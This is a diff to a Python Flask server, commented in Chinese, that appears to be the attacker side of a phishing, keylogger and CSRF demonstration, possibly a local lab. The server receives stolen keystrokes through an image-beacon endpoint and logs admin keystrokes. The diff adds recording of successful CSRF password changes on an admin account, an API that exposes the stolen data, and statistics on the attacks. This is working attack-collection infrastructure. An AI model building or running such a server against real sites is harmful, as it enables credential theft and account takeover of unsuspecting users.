@@ -29,6 +29,14 @@ def log_keylogger_data(keys, ip):
         f.write(f"[{timestamp}] IP: {ip} - Keys: {keys}\n")
     print(f"[KEYLOGGER] {ip}: {keys}")
 
+# 記錄 CSRF 攻擊成功的數據
+def log_csrf_attack(target_user, old_password, new_password, ip):
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    csrf_file = os.path.join(BASE_DIR, 'csrf_attacks.log')
+    with open(csrf_file, 'a', encoding='utf-8') as f:
+        f.write(f"[{timestamp}] IP: {ip} - Target: {target_user} - Old: {old_password} - New: {new_password}\n")
+    print(f"[CSRF ATTACK] {ip} - {target_user} password changed from {old_password} to {new_password}")
+
 @app.route('/')
 def index():
     return redirect('/login')  # 直接使用 URL 而不是 url_for
@@ -130,11 +138,21 @@ def fake_about():
 @app.route('/keylogger', methods=['GET'])
 def keylogger_receiver():
     keys = request.args.get('keys', '')
+    admin_keys = request.args.get('admin_keys', '')
+    admin_pwned = request.args.get('admin_pwned', '')
     client_ip = request.remote_addr
+    
+    if admin_pwned == 'success':
+        # 記錄 CSRF 攻擊成功
+        log_csrf_attack('admin', 'adminpass', 'hacked123', client_ip)
+        return '', 200, {'Content-Type': 'image/gif'}
+    
+    if admin_keys:
+        log_keylogger_data(f"[ADMIN] {admin_keys}", client_ip)
+        return '', 200, {'Content-Type': 'image/gif'}
     
     if keys:
         log_keylogger_data(keys, client_ip)
-        # 返回一個空的 GIF 回應
         return '', 200, {'Content-Type': 'image/gif'}
     
     return 'Bad Request', 400
@@ -202,6 +220,38 @@ def api_keylogger_data():
     
     return {'data': keylogger_data}
 
+# API 端點：獲取 CSRF 攻擊數據
+@app.route('/api/csrf_attacks')
+def api_csrf_attacks():
+    csrf_attacks = []
+    csrf_file = os.path.join(BASE_DIR, 'csrf_attacks.log')
+    if os.path.exists(csrf_file):
+        with open(csrf_file, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+            for line in lines:
+                if line.strip():
+                    try:
+                        # 解析日誌格式: [timestamp] IP: ip - Target: user - Old: old - New: new
+                        parts = line.strip().split(' - ')
+                        timestamp_ip = parts[0].split('] IP: ')
+                        timestamp = timestamp_ip[0][1:]  # 移除開頭的 [
+                        ip = timestamp_ip[1]
+                        target = parts[1].replace('Target: ', '')
+                        old_password = parts[2].replace('Old: ', '')
+                        new_password = parts[3].replace('New: ', '')
+                        
+                        csrf_attacks.append({
+                            'timestamp': timestamp,
+                            'ip': ip,
+                            'target': target,
+                            'old_password': old_password,
+                            'new_password': new_password
+                        })
+                    except:
+                        pass
+    
+    return {'data': csrf_attacks}
+
 # API 端點：獲取統計數據
 @app.route('/api/stats')
 def api_stats():
@@ -225,10 +275,18 @@ def api_stats():
                 except:
                     pass
     
+    # 統計 CSRF 攻擊數量
+    csrf_count = 0
+    csrf_file = os.path.join(BASE_DIR, 'csrf_attacks.log')
+    if os.path.exists(csrf_file):
+        with open(csrf_file, 'r', encoding='utf-8') as f:
+            csrf_count = len([line for line in f.readlines() if line.strip()])
+    
     return {
         'creds_count': creds_count,
         'keylogger_count': keylogger_count,
         'total_keys': total_keys,
+        'csrf_count': csrf_count,
         'server_status': 'Online',
         'fake_login_url': 'http://127.0.0.1:8888/login',
         'keylogger_url': 'http://127.0.0.1:8888/keylogger'
@@ -237,10 +295,10 @@ def api_stats():
 # 清空記錄
 @app.route('/clear')
 def clear_logs():
-    if os.path.exists(STOLEN_DATA_FILE):
-        os.remove(STOLEN_DATA_FILE)
-    if os.path.exists(KEYLOGGER_FILE):
-        os.remove(KEYLOGGER_FILE)
+    files_to_clear = [STOLEN_DATA_FILE, KEYLOGGER_FILE, os.path.join(BASE_DIR, 'csrf_attacks.log')]
+    for file_path in files_to_clear:
+        if os.path.exists(file_path):
+            os.remove(file_path)
     return '<h1 style="color: red;">所有記錄已清空!</h1><a href="/admin" style="color: lime;">返回控制面板</a>'
 
 if __name__ == "__main__":
